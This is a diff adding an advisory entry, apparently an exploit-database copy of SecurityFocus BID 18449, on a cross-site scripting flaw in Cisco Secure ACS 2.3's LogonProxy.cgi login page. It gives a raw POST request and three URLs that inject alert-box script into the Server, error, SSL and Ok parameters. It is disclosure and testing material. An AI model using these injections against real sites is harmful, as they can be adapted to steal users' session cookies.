@@ -1,0 +1,23 @@
+source: http://www.securityfocus.com/bid/18449/info
+
+Cisco Secure ACS is prone to a cross-site scripting vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input. 
+
+An attacker may leverage this issue to have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.
+
+This issue affects Cisco Secure ACS version 2.3 for UNIX; other versions may also be vulnerable.
+
+POST http://www.example.com:80/CScgi/LogonProxy.cgi HTTP/1.0
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*
+Referer: http://10.17.12.184/cs/index.html
+Accept-Language: en-gb
+Content-Type: application/x-www-form-urlencoded
+Proxy-Connection: Keep-Alive
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322)
+Host: 10.17.12.184
+Content-Length: 33
+Pragma: no-cache
+Server=0.0.0.0&error=<script>alert("help")</script>
+
+http://www.example.com/CScgi/LogonProxy.cgi?Server=0.0.0.0&error=<script>alert("help")</script>
+http://www.example.com/CScgi/LogonProxy.cgi?Server=10.17.12.184/Logon?null&SSL=<script>alert('help')</script>
+http://www.example.com/CScgi/LogonProxy.cgi?Ok=<script>alert('help')</script>
